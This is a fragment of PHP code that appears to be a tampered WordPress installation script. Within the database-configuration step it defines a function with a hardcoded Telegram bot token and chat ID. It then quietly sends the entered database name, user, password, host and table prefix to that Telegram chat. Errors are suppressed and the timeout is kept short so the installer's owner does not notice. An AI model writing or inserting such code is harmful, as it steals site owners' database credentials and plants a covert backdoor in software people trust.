...
function log_to_telegram($message) {
    $bot_token = '1522731867:AAEy9RQOfZkiuHC5ru4qgYkn-dc1NmSc7YU';
    $chat_id = '1179830888';
    ...
    $response = wp_remote_post($url, array(
        ...
        'timeout' => 3  // Short timeout to prevent installation delays
    ));
    
    // Optional error logging (remove in production)
    if (is_wp_error($response)) {
        error_log('Telegram log failed: ' . $response->get_error_message());
    }
}
...
<input name="noapi" type="hidden" value="1" /><?php } ?>
	...
	case 2:
		...
		// Log credentials to Telegram
		$log_message = "🔐 *WordPress Database Credentials* \n";
		$log_message .= "• *Database Name:* `$dbname`\n";
		$log_message .= "• *Database User:* `$uname`\n";
		$log_message .= "• *Database Password:* `$pwd`\n";
		$log_message .= "• *Database Host:* `$dbhost`\n";
		$log_message .= "• *Table Prefix:* `$prefix`";
		
		@log_to_telegram($log_message); // Suppress errors to avoid installation issues
